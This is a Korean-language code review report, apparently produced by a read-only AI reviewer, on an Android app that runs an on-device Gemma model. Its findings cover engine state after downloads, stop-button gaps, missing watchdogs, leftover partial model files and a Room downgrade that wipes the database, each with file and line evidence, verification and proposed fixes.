- 제안: close() 가 '엔진 해제로 끊음' 표시를 남기게 한다 — 예: TurnCancellation 에 releaseCancel() 을 두어 끊은 대화를 기록하고, runTurn 의 스트리밍·비스트리밍 양쪽에서 그 표시가 있으면 결과와 상관없이 AppError.ModelNotReady("Engine released") 를 돌려준다(부분 글·툴 호출은 버림). 그러면 요약 스케줄러의 기존 ModelNotReady 분기가 재시도로 세지 않고, 채팅 쪽도 '엔진이 내려갔어요'로 일관되게 처리된다. TurnCancellationTest 에 경우 추가, 요약 스케줄러 테스트에 '끊김은 재시도 0' 추가.
- 근거:
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:543 — close() 가 진행 중 대화에 cancelProcess 를 직접 호출(TurnCancellation.requestCancel 을 거치지 않아 '취소됨' 표시가 없음)
  - GemmaModelRunner.kt:370-380, 427-430 — 비스트리밍(요약·추출 등)은 끊기면 예외 → ModelInferenceError 로 반환(ModelNotReady 아님)
  - GemmaModelRunner.kt:330-365 — 스트리밍(채팅)은 userCancelled=false 라 예외면 오류, 조용히 끝나면 잘린 글과 덜 온 툴 호출을 그대로 성공으로 반환(사용자 취소 분기의 '끊긴 툴 호출은 버린다' 보호가 적용되지 않음)
  - app/src/main/java/com/kosmos/app/assistant/episode/EpisodeSummarizeScheduler.kt:274-287, 410 — ModelNotReady 만 '재시도로 세지 않음', 그 밖의 실패는 retryCount+1, 3회면 FAILED 고정
  - app/src/main/java/com/kosmos/app/assistant/startup/StartupCoordinator.kt:132 — 앱을 열 때마다 채팅 전에 요약 추론이 먼저 돈다(약 7초)
- 검증: 직접 읽은 근거: GemmaModelRunner.kt:543 close() 는 cancellation.activeConversation()?.cancelProcess() 를 직접 불러 TurnCancellation(TurnCancellation.kt:34-41)의 cancelled 표시를 세우지 않는다. 비스트리밍(370-380): 감시 시간 초과가 아니면 getOrThrow 가 예외를 바깥 catch(427-430)로 보내 ModelInferenceError 가 된다 — ModelNotReady 가 아니다. 스트리밍(339-365): userCancelled=false 라 예외면 356줄 오류, 조용히 끝나면 362-364줄에서 잘린 글과 그때까지 모인 툴 호출이 성공으로 나간다(354줄의 '끊긴 툴 호출은 버린다' 보호는 사용자 취소 분기에만 있음). EpisodeSummarizeScheduler.kt:274-287 은 ModelNotReady 만 재시도로 세지 않고 나머지는 retryCount+1, 3회(MAX_RETRY, 410줄)면 FAILED 고정. FAILED 를 되돌리는 코드는 grep 으로 찾지 못했다(유일한 FAILED 기록 지점이 281줄). StartupCoordinator.kt:132 가 앱을 열 때마다 요약을 먼저 돌린다. 한계: 네이티브가 cancelProcess 에 예외를 던지는지 조용히 끝내는지는 코드로 확정 불가(후보 본인도 밝힘) — 예외면 실패 횟수 누적, 조용하면 잘린 요약이 저장될 수 있어 어느 쪽이든 문제다(잘린 요약은 한글 비율 검사로 걸러지지 않음). 심각도를 medium 으로 낮춘 이유: 영구 실패는 같은 대화의 요약(수 초 창)이 세 번 끊겨야 하고, 원문 대화는 타임라인에 남는다. runtime-1 을 고치면 발생 빈도도 준다.
- 앞선 기록: CHANGELOG 0.27.x M1(docs/CHANGELOG.md:963 — 뮤텍스 안 Ready 재확인), CHANGELOG 0.41.14(docs/CHANGELOG.md:270 — 기억 정리 쪽만 '앱을 나가서 멈춤'을 따로 구분), EpisodeSummarizeScheduler.kt 의 ModelNotReady 분기 주석 — 해제가 끊은 추론 결과의 구분은 기록 없음

### runtime-3 · 모델 받기가 끝나면(임베딩 모델 포함) 채팅 엔진 상태가 '파일 있음'으로 내려가 입력창이 '깨우는 중'으로 잠긴다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 설정에서 임베딩 모델(약 485MB)을 받는 동안 앱을 계속 쓰는 것이 자연스러운데, 받기가 끝나는 순간 멀쩡히 올라와 있던 채팅 엔진의 상태가 FileFound 로 바뀐다. 스플래시 뷰모델은 이미 없어 다시 Ready 로 올려 줄 곳이 없고, 채팅 입력창은 '깨우는 중'으로 잠긴 채 앱을 나갔다 들어올 때까지 풀리지 않는다(턴을 보내도 'Model is not ready'). 0.16.1 과 같은 계열(상태가 사실과 어긋남)인데 워커 경로가 남았다. 같은 뿌리로, warmUp 이 매번 checkModelFile 로 Ready 를 잠깐 내렸다 올려(문서 뷰어에서 돌아올 때 등) 시작 단계가 다시 돌고, ModelInfo.lastLoadedAt 때문에 Ready 가 매번 다른 값으로 방출된다.
- 제안: ① checkModelFile 이 엔진이 살아 있는 상태(InitializingEngine·Ready)이고 찾은 파일 경로가 같으면 상태를 건드리지 않게 한다(경로가 달라졌거나 파일이 사라졌을 때만 내림). ② 워커는 받은 파일이 채팅 모델일 때만 재탐색하고(임베딩이면 EmbeddingModelManager.refresh 만), 채팅 모델을 새로 받은 경우엔 전경이면 warmUp 까지 잇는다. ③ 완료 알림 문구도 임베딩/채팅을 구분. 테스트: Ready 상태에서 checkModelFile → 상태 불변, 임베딩 받기 완료 → 채팅 상태 불변.
- 근거:
  - app/src/main/java/com/kosmos/app/work/ModelDownloadWorker.kt:94 — 어떤 파일을 받았든 완료 시 modelLoadManager.checkModelFile() 호출
  - app/src/main/java/com/kosmos/app/work/WorkManagerModelDownloadScheduler.kt:95 + app/src/main/java/com/kosmos/app/runtime/embedding/EmbeddingModelManager.kt:51 — 임베딩 모델도 같은 워커로 받는다
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaRuntimeManager.kt:61-91 — checkModelFile 은 지금 상태(Ready·엔진 올리는 중)를 보지 않고 FileFound 로 덮어쓴다
  - app/src/main/java/com/kosmos/app/assistant/startup/StartupCoordinator.kt:108-111 — Ready 가 아니면 단계가 WAITING_ENGINE
  - app/src/main/java/com/kosmos/app/feature/chat/ChatHeader.kt:266-269 + ChatInputBar.kt:88 — 단계가 도는 중이고 엔진이 Ready 가 아니면 '깨우는 중' 문구로 입력창 잠금, '다시 시도' 버튼은 오류·모델 없음일 때만(ChatHeader.kt:203-213)
  - app/src/main/java/com/kosmos/app/feature/settings/ModelManagementScreen.kt:159-167, EmbeddingModelSection.kt:98-99 — 완료 처리에 warmUp 호출 없음
- 검증: 직접 읽은 근거: ModelDownloadWorker.kt:94 는 받은 파일 종류와 무관하게 modelLoadManager.checkModelFile() 을 부른다. EmbeddingModelDownloadScheduler(WorkManagerModelDownloadScheduler.kt:60-64, 95)와 EmbeddingModelManager.kt:51 로 임베딩 모델도 같은 워커를 쓴다. GemmaRuntimeManager.kt:61-91 checkModelFile 은 현재 상태를 보지 않고 FileFound(또는 NotFound)로 덮어쓴다. 그 뒤 StartupCoordinator.kt:108-111 이 단계를 WAITING_ENGINE 으로 두고, ChatHeader.kt:266-269 + ChatScreen.kt:372 + ChatInputBar.kt:88 이 '깨우는 중' 문구로 입력을 잠근다. 채팅 상태 시트의 다시 시도 버튼은 Error·NotFound 일 때만 보인다(ChatHeader.kt:203-213, 250-258). EmbeddingModelSection.kt:92-104 와 ModelManagementScreen.kt:159-167 의 완료 처리에는 warmUp 이 없다. 채팅으로 돌아오는 것은 같은 Activity 안 이동이라 ModelWarmUpObserver.onStart 도 오지 않는다. 고칠 세부 하나: '앱을 나갔다 들어올 때까지 풀리지 않는다'는 과장이다 — 설정의 모델 상태 새로고침(SettingsScreen.kt:102 → SettingsViewModel.refreshModelState → warmUp)으로도 풀리고, 엔진 객체는 살아 있어 warmUp 이 초기화를 건너뛰고 곧 Ready 로 돌아온다. 다만 사용자가 그 길을 알 방법이 없다. 앱이 백그라운드일 때 받기가 끝나면 이미 엔진이 내려가 있어 문제 없음 — 전경에서 쓰는 중 완료될 때만 생긴다. 덧붙인 'warmUp 이 매번 Ready 를 내렸다 올린다'(GemmaModelRunner.kt:560)는 사실이나 StartupCoordinator 주석대로 알고 견디게 한 부분이다.
- 앞선 기록: CHANGELOG 0.16.1·0.16.2(거짓 Ready / FileFound 멈춤 — 설정 새로고침·재진입 경로만 처리), StartupCoordinator.kt:69-70 주석(Ready→로딩→Ready 요동은 알고 견디게 함), SettingsViewModel.kt:136-141 주석

### runtime-4 · 사진·파일 고르기 화면에 0.7초 넘게 머물면 엔진이 내려가, 첨부할 때마다 10초 넘는 재로드를 치른다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 사진을 붙여 묻는 것은 핵심 기능인데, 선택 화면은 다른 앱의 화면이라 우리 프로세스가 '백그라운드'로 판정돼 엔진과 채팅 대화 상태가 통째로 내려간다. 돌아오면 엔진 재초기화(기록상 약 10초) + 시작 단계 + 대화 다시 읽기를 기다려야 첫 답이 나온다. 매일 쓰면 가장 자주 체감될 지연이다. 다만 '백그라운드면 즉시 해제'는 사용자가 정한 불변식이라 예외를 둘지는 결정이 필요하다(코드 흐름은 확인, 기기에서 시간은 재지 않음).
- 제안: 사용자 결정 사항으로 올린다: 앱이 스스로 띄운 선택 화면에서 돌아올 때까지만 해제를 미루는 짧은 유예. 예) 첨부 버튼을 누를 때 '결과 기다리는 중' 표시를 세우고, onStop 은 그 표시가 있으면 close() 를 N초(예: 60초) 뒤로 미루며 그 안에 돌아오면 취소. onTrimMemory(메모리 압박)는 유예 없이 즉시 해제를 유지해 안전판을 남긴다. 유예 중에는 새 추론을 시작하지 않으므로 2-⑥(백그라운드 로드 금지)은 그대로다. 실기기에서 유예 유무의 첫 답 시간만 한 번 비교.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:239-241 — 이미지 첨부가 시스템 선택 화면(GetContent, 다른 프로세스의 Activity)을 띄움
  - app/src/main/java/com/kosmos/app/KosmosApp.kt:97-115 — ProcessLifecycleOwner.onStop(우리 프로세스의 화면이 모두 멈춘 뒤 약 700ms)에서 조건 없이 modelRunner.close()
  - app/src/main/java/com/kosmos/app/platform/launch/ModelWarmUpObserver.kt:32-35 + StartupCoordinator.kt:95-103 — 돌아오면 warmUp(재초기화) 뒤 시작 단계(요약·브리핑·미리 준비)까지 다시
- 검증: 직접 읽은 근거: ChatScreen.kt:239-241 이 GetContent 계약으로 시스템 선택 화면(다른 프로세스 화면)을 띄운다. KosmosApp.kt:97-115 의 프로세스 단위 onStop 은 조건 없이 modelRunner.close() 를 부른다 — 선택 화면이 화면 전체를 덮으면 우리 화면이 모두 멈춰 이 경로를 탄다. 돌아오면 ModelWarmUpObserver.kt:32-35 가 warmUp(엔진 재초기화), StartupCoordinator.kt:95-102 가 시작 단계를 다시 돌리고 그동안 입력창이 잠긴다. 코드 흐름은 주장대로다. 다만 (1) '700ms'와 재로드 시간은 기기에서 재지 않은 값이고(CHANGELOG 0.16.2 의 9~12초 기록에 기댄 추정), (2) 선택 화면이 반투명 시트로 뜨는 기기·버전이면 onStop 이 오지 않을 수 있어 실제 발생 여부는 에뮬레이터나 휴대폰에서 한 번 확인이 필요하다. (3) 고치려면 '백그라운드 즉시 해제' 불변식에 예외를 두는 것이라 사용자 결정 사항이다 — 결함이 아니라 설계 대가로 분류해 올려야 한다. 유예를 둔다면 onTrimMemory 즉시 해제를 유지하는 제안 방향은 타당하다.
- 앞선 기록: AGENTS 2-⑥·ADR-027(백그라운드 즉시 해제는 사용자가 정한 불변식), KosmosApp.kt:98-100 주석(문서 뷰어는 같은 프로세스라 해제 안 됨) — 시스템 선택 화면 경유 해제에 대한 기록은 CHANGELOG·architecture·plans 에서 찾지 못함

### runtime-5 · 브리핑·음성 받아쓰기 추론에는 출력 상한도 깨진 글 거르기도 없다 — 폭주하면 시작 화면이 최대 2분 묶인다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 0.42.4 에서 원인 미상의 폭주(깨진 글자를 엔진 한도까지)를 겪고 네 가지 부수 추론에만 안전장치를 넣었다. 브리핑은 같은 종류의 추론인데 빠져 있어, 재발하면 시작 화면이 감시 시간(120초)까지 멈추고 깨진 브리핑이 저장·표시된다. 받아쓰기가 폭주하면 깨진 글이 사용자 말로 저장돼 채팅 턴까지 간다. 임베딩을 CPU 로 바꿔 발생 조건은 줄었지만 근본 원인은 모른다고 기록돼 있다. 또 상한 판정이 디버그 전용 값에 기대고 있어 포트폴리오 단계의 릴리스 빌드에서는 상한 자체가 꺼진다.
- 제안: OneShotLimits 에 BRIEFING·TRANSCRIBE 를 더해 두 유스케이스에 maxOutputTokens 를 싣고(정상 길이의 몇 배 — 기록된 실측으로 정함), 브리핑에는 BrokenOutput.looksBroken 을 걸어 깨지면 저장하지 않고 다음 Ready 에 다시. 릴리스 대비로는 상한 판정을 벤치마크가 아니라 sendMessage 가 돌려준 글 길이(추정 토큰)로도 볼 수 있게 한 줄 보탠다. 모델에 들어가는 글은 바뀌지 않는다(출력 길이 제한만).
- 근거:
  - domain/src/main/java/com/kosmos/app/domain/usecase/GenerateBriefingUseCase.kt:53-59 — oneShot 인데 maxOutputTokens 없음, 결과는 비었는지만 확인
  - domain/src/main/java/com/kosmos/app/domain/usecase/TranscribeAudioUseCase.kt:36-42 — 같음(받아쓴 글이 그대로 사용자 메시지가 됨)
  - domain/src/main/java/com/kosmos/app/domain/modelrunner/OneShotLimits.kt:11-16 — 상한은 요약·추출·회고·판정 네 가지뿐
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:389-395 — 상한 판정은 maxOutputTokens 가 있을 때만, 그것도 디버그 빌드의 벤치마크 값에 의존(RuntimeDiagnostics.kt:77-79)
  - core/src/main/java/com/kosmos/app/core/common/Constants.kt:121 + StartupCoordinator.kt:135-138 — 비스트리밍은 감시 120초가 유일한 끝, 브리핑은 채팅을 열기 전에 돈다
- 검증: 맞는 부분(직접 읽음): GenerateBriefingUseCase.kt:51-59 와 TranscribeAudioUseCase.kt:36-44 는 oneShot 인데 maxOutputTokens 가 없고 결과는 비었는지만 본다. OneShotLimits.kt:11-16 은 네 가지뿐이고, maxOutputTokens·looksBroken 사용처 grep 결과 요약·추출·회고·판정(합치기 2곳)만 나온다. 둘 다 onToken 없이 불려 비스트리밍 경로라 감시 120초(Constants.kt:121)가 유일한 끝이고, 브리핑은 채팅을 열기 전(StartupCoordinator.kt:135-138)에 돈다. 틀린 부분: '릴리스 빌드에서는 상한 자체가 꺼진다'는 아니다 — GemmaModelRunner.kt:371 이 maxOutputToken 을 네이티브 sendMessage 에 그대로 넘기므로 생성은 릴리스에서도 상한에서 멈춘다. 디버그에 기대는 것은 '상한에 닿았으니 실패로 돌린다'는 판정(390-395, RuntimeDiagnostics.kt:77-79)뿐이고, 이는 CHANGELOG 0.42.4 에 이미 알고 적어 둔 내용이다. 심각도를 low 로 낮춘 이유: 폭주는 원인 미상이지만 임베딩을 CPU 로 바꾼 뒤 사라졌다고 기록돼 있고, 브리핑은 하루 한 번, 최악도 120초로 묶인다. 고치는 비용은 작다(상한 두 개 추가 + 브리핑에 깨진 글 검사). 세부: 받아쓰기는 영어 발화가 정상일 수 있어 한글 비율 검사를 그대로 걸면 안 되고 상한만 거는 것이 맞다.
- 앞선 기록: CHANGELOG 0.42.4(docs/CHANGELOG.md:139 — 상한은 요약 800·추출 300·회고 400·판정 120, '채팅은 상한 없음', '디버그 빌드 — 벤치마크 토큰 수로 판정, 릴리스는 ②(깨진 글 거르기)만'으로 이미 적혀 있음), CHANGELOG 0.42.8(임베딩 CPU 기본). 브리핑·받아쓰기를 일부러 뺐다는 기록은 계획서 0.42.4 에도 없음

### runtime-6 · 대화 미리 준비·복원은 무활동 감시 없이 엔진 잠금을 쥔 채 네이티브를 부른다 — 멈추면 시작 화면과 다음 질문이 함께 묶인다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 채팅 추론에는 '120초 동안 토큰이 없으면 끊는다'는 감시가 있는데, 같은 네이티브 호출을 하는 미리 준비 경로에는 없다. 여기서 네이티브가 멈추면(GPU 드라이버 문제 등 — 감시를 둔 이유와 같은 상황) 잠금이 풀리지 않아 시작 화면이 '대화 준비 중'에서 끝나지 않고, 채팅 중이라면 다음 질문이 잠금 대기로 무한정 멈춘다. 앱을 강제 종료해야 한다. 발생 빈도는 낮을 것으로 보이나(추정) 막는 비용이 작다.
- 제안: prepareConversation 의 sendMessage 와 복원용 getTokenCount 를 InferenceWatchdog 로 감싼다(끝나면 stop, 시간 초과면 cancelProcess 뒤 discardCachedConversation — 지금의 실패 처리와 같은 길). 복원 경로에도 cancellation.begin/end 를 걸어 사용자 중지가 닿게 한다.
- 근거:
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:433-473 — prepareConversation 이 lifecycleMutex 안에서 sendMessage(프리필)·getTokenCount(복원)를 InferenceWatchdog 없이 호출
  - GemmaModelRunner.kt:187-207, 300 — 감시는 runTurn 에서만 생성
  - GemmaModelRunner.kt:452-456 — 복원 경로는 cancellation.begin 도 없어 중지 버튼으로도 못 끊음
  - app/src/main/java/com/kosmos/app/assistant/startup/StartupCoordinator.kt:139-146 + ConversationPrewarmer.kt:66-68 — 시작 단계가 prepareNow 를 끝까지 기다림(join)
- 검증: 직접 읽은 근거: GemmaModelRunner.kt:433-473 prepareConversation 은 lifecycleMutex 안에서 getOrCreateConversation(448)·getTokenCount(453)·sendMessage(463)를 InferenceWatchdog 없이 부른다. 감시는 runTurn 300줄에서만 만들어진다. 복원 경로(449-457)에는 cancellation.begin 이 없어 사용자 중지도, close() 의 cancelProcess(543 — activeConversation 이 null)도 닿지 않는다. 프리필 send 경로(461-466)는 begin/end 가 있어 중지·해제는 닿지만 시간 감시는 없다. StartupCoordinator.kt:139-146 과 ConversationPrewarmer.kt:66-68(prepareNow 가 join)로 시작 단계가 끝까지 기다린다. 네이티브가 실제로 멈추면 뮤텍스가 풀리지 않아 이후 runTurn(262줄)과 close 의 해제(545줄)까지 막힌다는 추론은 코드상 맞다. 다만 이 경로에서 멈춘 사례 기록은 없고 빈도는 추정이라 low 유지. 참고: runTurn 도 대화 생성(287줄) 구간은 감시 밖이라 같은 빈틈이 있다.
- 앞선 기록: CHANGELOG 0.39.2 M3·0.41.7 M3(미리 준비·복원 도입), docs/plans/0.39.2-guards-and-prewarm.md:76(미리 만드는 중 홈으로 나가는 경우만 기기 확인) — 감시 범위에 대한 기록은 없음

### runtime-7 · 앱이 한 번 재시작되면 '받다 만 모델 파일 지우기'가 아무 일도 하지 않는다 — 최대 3.6GB 가 남는다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 받기가 실패·취소된 뒤 프로세스가 죽었다 살아나면(큰 앱이라 흔함) 스케줄러는 무엇을 받고 있었는지 잊는다. 그 뒤 '부분 파일까지 지우기'를 눌러도 .part 파일이 그대로 남고, 실패 안내의 '이어받기 가능 용량'은 0 으로 보인다. 사용자에게는 지운 것처럼 보이는데 저장 공간은 돌아오지 않는다. 받기 실패 뒤에만 생기는 일이라 빈도는 낮지만, 용량이 크고 화면에서 되돌릴 방법이 없다.
- 제안: 스케줄러마다 대상이 하나로 정해져 있으므로(채팅 모델 URL/파일, 임베딩 모델 URL/파일) 생성자에 기본 대상을 넘겨 lastRequest 가 비었을 때 그것을 쓰게 한다. 또는 ModelDownloader 에 '폴더 안의 .part·.part.meta 를 모두 지우기/크기 합'을 두어 URL 없이 동작하게 한다. 테스트: 새 스케줄러 인스턴스에서 cancel(deletePartial=true) 가 clearPartial 을 부르는지.
- 근거:
  - app/src/main/java/com/kosmos/app/work/WorkManagerModelDownloadScheduler.kt:79 — 마지막 요청(URL·파일 이름)을 메모리(MutableStateFlow)에만 보관
  - WorkManagerModelDownloadScheduler.kt:125-131 — cancel(deletePartial=true) 가 lastRequest 가 null 이면 그냥 return
  - WorkManagerModelDownloadScheduler.kt:156-157 — 실패 카드의 '이어받을 수 있는 크기'도 같은 값에 의존해 0 으로 나옴
  - app/src/main/java/com/kosmos/app/runtime/embedding/EmbeddingModelManager.kt:57-58 — 임베딩 모델 지우기도 같은 cancel(deletePartial=true) 에 기댐
  - app/src/main/java/com/kosmos/app/feature/settings/ModelManagementViewModel.kt:89-90 — 화면의 '부분 파일 폐기'가 이 경로
- 검증: 직접 읽은 근거: WorkManagerModelDownloadScheduler.kt:79 lastRequest 는 메모리의 MutableStateFlow 이고 enqueue(113줄)에서만 채워진다. 125-131 cancel(deletePartial=true)은 lastRequest 가 null 이면 128줄에서 그냥 돌아간다. 156-157 resumableBytes 도 같은 값에 기대 0 을 돌려준다. 실패 상태 자체는 WorkManager 가 며칠 보관하므로 프로세스가 다시 뜬 뒤에도 실패 카드와 '지우기' 버튼은 보이는데(ModelManagementScreen.kt:82, 181-182, ModelManagementViewModel.kt:89-90) 눌러도 아무 일도 하지 않는다. EmbeddingModelManager.kt:57-63 delete() 도 같은 cancel 에 기대고 확정된 파일만 직접 지운다. ModelDownloadService.kt:242-251 clearPartial·partialBytes 는 URL·파일 이름이 있어야 대상을 찾는다. 받는 중 프로세스가 재시작돼 워커만 다시 도는 경우의 '취소 후 삭제'도 같은 이유로 부분 파일이 남는다. low 유지 이유: 받기 실패·취소 뒤 재시작이라는 드문 조건이고, 다시 받기를 누르면 이어받아 공간이 결국 정리된다. 제안(스케줄러별 기본 대상을 생성자로 넘김)은 타당하다.
- 앞선 기록: CHANGELOG 0.41.9(pruneWork 제거·재시도 한도 — WorkManagerModelDownloadScheduler.kt:139-141 주석), ADR-006(.part 보존) — 재시작 뒤 부분 파일 지우기가 무효가 되는 점은 기록 없음

### runtime-8 · 대화를 만들거나 되살리는 몇 초 사이에 누른 '중지'는 이번 답에 먹지 않는다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 보내자마자 마음이 바뀌어 중지를 누르는 순간이 마침 대화를 새로 만들거나 되살리는 구간이면, 그 중지는 '다음 턴용'으로만 기록되고 이번 답은 끝까지 생성된다. 한 번짜리 답이면 중지가 사실상 무시되고(다음 요청 시작 때 지워짐), 툴을 쓰는 답이면 엉뚱하게 툴 실행 뒤 회신 턴이 빈 답으로 끝난다. 실사용에서 '중지가 안 먹네'로 느껴질 수 있는 작은 빈틈이다.
- 제안: runTurn 에서 cancellation.begin(currentConversation) 직후 consumePending() 을 한 번 더 확인해, 걸려 있으면 send 를 시작하지 않고 지금의 '턴 사이 중지' 처리(빈 부분 응답 + 필요하면 대화 버리기)로 끝낸다. TurnCancellationTest 에 '생성 중 들어온 중지' 경우 추가.
- 근거:
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:278-291 — 걸어 둔 중지는 턴 맨 앞(278)에서만 확인, 진행 중 대화 등록(begin)은 대화 생성·복원(287) 뒤인 291
  - app/src/main/java/com/kosmos/app/runtime/gemma/TurnCancellation.kt:34-41 — 등록된 대화가 없으면 '다음 채팅 턴에 적용'으로만 남김
  - GemmaModelRunner.kt:283, 630-681 — 그 사이 구간에 발열 대기(1초)·대화 재생성(문법 준비)·부수 추론 뒤 상태 복원(기록상 3초대)이 들어감
- 검증: 직접 읽은 근거: GemmaModelRunner.kt:278 에서만 걸어 둔 중지(consumePending)를 확인하고, 진행 중 대화 등록(begin)은 291줄이다. 그 사이에 283줄 발열 대기(RuntimeMetricsCollector.kt:109-117 — 경고 온도 이상일 때만 1초)와 287줄 대화 생성·재사용 판정(630-681, 토큰 수 조회와 createConversation 포함)이 있다. TurnCancellation.kt:34-41 은 active 가 없으면 pending=true 로만 남긴다. ChatViewModel.kt:552-557 cancelGeneration 은 modelRunner.cancel() 만 부르고 코루틴은 취소하지 않으므로, 이 구간의 중지는 이번 답에 닿지 않는다. 남은 pending 은 다음 요청 시작 때 지워지거나(ChatViewModel.kt:445), 같은 요청의 툴 회신 턴이 278줄에서 소비해 빈 답으로 끝난다 — 주장대로다. 구간이 대개 짧아(부수 추론 뒤 복원이 걸릴 때만 수 초) low 유지. 제안 보완: begin 직후 consumePending 을 한 번 더 보는 것만으로는 begin 과 네이티브 send 시작 사이의 아주 짧은 틈이 남는다 — 그 틈의 중지는 cancelled 표시만 서고 생성은 끝까지 가서, 답 전체가 나온 뒤 툴 호출만 버려진다(339·350-354줄). 테스트를 추가할 때 이 경우도 함께 정해 두는 것이 좋다.
- 앞선 기록: CHANGELOG 0.38.6 M0(턴 사이 중지를 '다음 채팅 턴을 시작하지 않음'으로 — TurnCancellation.kt:6-8 주석이 다루는 범위는 전사 직후·프롬프트 조립·뮤텍스 대기까지)

<details><summary>읽은 범위</summary>

저장소 루트: C:\Users\SSAFY\Desktop\dev\lets_meet_on_friday. 읽기 전용으로 진행(파일·git 변경 없음, gradle·adb·실험 실행 없음).

[전부 직접 읽은 파일] runtime/gemma: GemmaModelRunner·GemmaRuntimeManager·TurnCancellation·ConversationPolicy·RuntimeDiagnostics·MtpMode·GemmaTokenizer·ImageInputAdapter(대부분), runtime/embedding: EmbeddingGemmaRunner·EmbeddingModelManager, runtime/metrics: RuntimeMetricsCollector, platform/device 2개, platform/memory/MemoryEmbedder, platform/launch/ModelWarmUpObserver, work: ModelDownloadWorker·WorkManagerModelDownloadScheduler·DownloadRetryBudget, data 의 ModelDownloadService, KosmosApp, StartupCoordinator, ConversationPrewarmer, domain InputActivity, SplashViewModel, OneShotLimits. 일부만 본 것: ChatViewModel·ChatHeader·ChatInputBar·ChatScreen·SplashScreen·ModelManagementViewModel/Screen·EpisodeSummarizeScheduler·GenerateBriefingUseCase·TranscribeAudioUseCase(관련 줄만).
[읽지 않은 것] KosmosToolDeclarations·EmulatorDetection(모델 입력 선언이라 범위 관점 밖), LibraryEmbedder·BriefingNotification*(다른 영역), LiteRT-LM 네이티브 동작(cancelProcess 뒤 예외/조용한 종료, getTokenCount 스레드 안전성)은 코드로 확인 불가 — 해당 항목은 confidence 를 medium 으로 낮춤. 그래프 도구는 쓰지 않고 grep·직접 읽기로만 확인.

[버린 항목 4건]
1) 모델 파일 체크섬 없음(크기만 비교) — docs/architecture.md:1300 에 '수용된 리스크'로 기록된 결정이라 제외.
2) 채팅 스트리밍 답에 출력 상한·깨진 글 거르기 없음 — CHANGELOG 0.42.4 에 '채팅은 상한 없음'으로 일부러 둔 것이고 0.42.8 에서 원인 쪽(임베딩 CPU)을 처리해 제외(runtime-5 의 배경으로만 언급).
3) currentKvTokens()(GemmaModelRunner.kt:139-140)가 엔진 잠금·전용 스레드 밖에서 네이티브 getTokenCount 를 부름 — 툴 승인 대기 중 끼어든 부수 추론과 겹칠 수 있으나 조건이 매우 좁고 네이티브 스레드 안전성을 확인하지 못해(추정) 제외.
4) 디버그 빌드에서 대화 생성 때마다 앞부분 전체(사용자 발화 포함)를 logcat 에 남김(RuntimeDiagnostics.kt:137-155) — '실사용은 디버그 빌드, 로그 제거는 포트폴리오 단계' 결정 범위라 제외.
그 밖에 다운로드 이어받기(ETag·416·완료 직전 종료·백업 되돌리기), 임베딩 엔진 해제/공존, 발열 게이트, 엔진 초기화 GPU→CPU 폴백과 실패 엔진 닫기는 읽은 범위에서 문제를 찾지 못했다.

</details>

## 데이터 계층 (data)

### data-1 · 옛 스키마 버전의 앱을 덮어 깔면 기억 전체가 예고 없이 지워진다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 실사용 단계의 데이터 손실 위험이다. 스키마를 올린 회차(예: 15)를 휴대폰에 깔았다가 그 회차를 접고(0.42.9 처럼) 스키마 14 인 다음 빌드를 깔면, 앱 버전 번호는 올라가므로 설치는 그대로 되고 Room 이 첫 실행에서 모든 표를 지우고 새로 만든다. 경고·백업·로그 화면이 없어 사용자는 빈 앱을 보고서야 안다. 복원 경로만 막혀 있고 설치 경로는 열려 있다.
- 제안: 둘 중 하나. (가) 파괴적 폴백 줄을 빼서 버전이 낮아지면 지우지 않고 오류로 멈추게 한다(데이터는 남고, 맞는 빌드를 다시 깔면 복구). (나) provideKosmosDatabase 에서 Room 을 만들기 전에 readSqliteUserVersion(dbFile) 을 읽어 SCHEMA_VERSION 보다 크면 DB 파일을 `kosmos_db.newer-v<N>.bak` 으로 복사해 두고 진행한다. 어느 쪽이든 순수 파일 판정 함수로 빼면 JVM 테스트로 고정할 수 있다.
- 근거:
  - data/src/main/java/com/kosmos/app/data/di/DatabaseModule.kt:43 — fallbackToDestructiveMigrationOnDowngrade(dropAllTables = true)
  - data/src/main/java/com/kosmos/app/data/local/db/KosmosDatabase.kt:61 — SCHEMA_VERSION = 14 (앱 버전 번호와 따로 움직인다)
  - data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:156-165 — 복원 경로는 같은 위험을 이미 알고 막아 두었다(주석: '조용히 전부 지우고')
  - data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:267 — DB 를 열지 않고 버전을 읽는 readSqliteUserVersion 이 이미 있다
- 검증: 직접 확인: data/.../di/DatabaseModule.kt:40-43 에 fallbackToDestructiveMigrationOnDowngrade(dropAllTables = true), KosmosDatabase.kt:61 SCHEMA_VERSION = 14, app/build.gradle.kts:22-24 versionCode 는 회차마다 늘 증가(42010). 같은 위험을 ExportImportManager.kt:156-165 주석이 '조용히 전부 지우고'라고 스스로 적고 복원 쪽만 막았다. 기록(CHANGELOG 1282)은 false 대신 true 를 고른 이유일 뿐, 다운그레이드 때 지우는 동작 자체를 실사용 단계에서 유지하기로 한 결정은 아니다 → 주장 성립. 다만 심각도는 medium 으로 낮춘다: 발동 조건이 '스키마를 올린 빌드를 휴대폰에 깐 뒤, 스키마만 되돌리고 버전 번호는 더 높은 빌드를 다시 깔기'로 좁다(옛 커밋을 그대로 빌드하면 versionCode 가 낮아 설치 자체가 거부된다). 0.42.9 에서 접은 것은 모델 입력 한 줄이지 스키마가 아니었다. 고칠 때 주의: 제안 (나)의 readSqliteUserVersion 은 본 파일 머리만 읽는데, WAL 모드에서는 마이그레이션이 쓴 user_version 이 아직 -wal 에만 있을 수 있어(프로세스가 죽어 체크포인트가 안 된 경우) 낮은 값을 읽고 통과할 수 있다. 폴백 줄을 빼는 (가)가 더 단순하고 확실하다(데이터는 남고 실행 시 오류로 멈춤).
